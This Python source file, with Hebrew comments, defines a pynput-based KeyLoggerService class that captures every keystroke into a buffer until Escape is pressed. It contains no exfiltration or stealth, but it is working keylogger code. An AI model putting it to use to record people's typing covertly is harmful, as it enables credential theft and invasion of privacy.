from pynput import keyboard
from IKeyLogger import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self, on_escape_callback=None):
        self.buffer = []
        self.listener = None
        self.on_escape_callback = on_escape_callback

    def _on_press(self, key):
        try:
            # תו רגיל (KeyCode)
            if key.char is not None:
                # מקרה מיוחד: Enter ב-Windows יכול להופיע בתור "\r"
                if key.char == "\r":
                    self.buffer.append("\n")
                else:
                    self.buffer.append(key.char)
                return
        except AttributeError:
            # לא KeyCode אלא מקש מיוחד (Key)
            pass

        # --- מקשים מיוחדים (Key) ---

        if key == keyboard.Key.space:
            self.buffer.append(" ")
        elif key == keyboard.Key.enter:
            self.buffer.append("\n")
        elif key == keyboard.Key.backspace:
            self.buffer.append("[BACKSPACE]")
        elif key == keyboard.Key.esc:
            if self.on_escape_callback:
                self.on_escape_callback()
            return False
        else:
            # שם המקש (fallback) אם לא זוהה
            name = getattr(key, "name", None) or str(key).replace("Key.", "")
            self.buffer.append(f"[{name}]")

    def start_logging(self) -> None:
        # התחלת האזנה למקלדת
        if not self.listener:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()

    def stop_logging(self) -> None:
        # עצירת האזנה למקלדת
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self) -> str:
        # מחזיר את כל המקשים שנקלטו כמחרוזת אחת
        temp = "".join(self.buffer)
        self.buffer = []
        return temp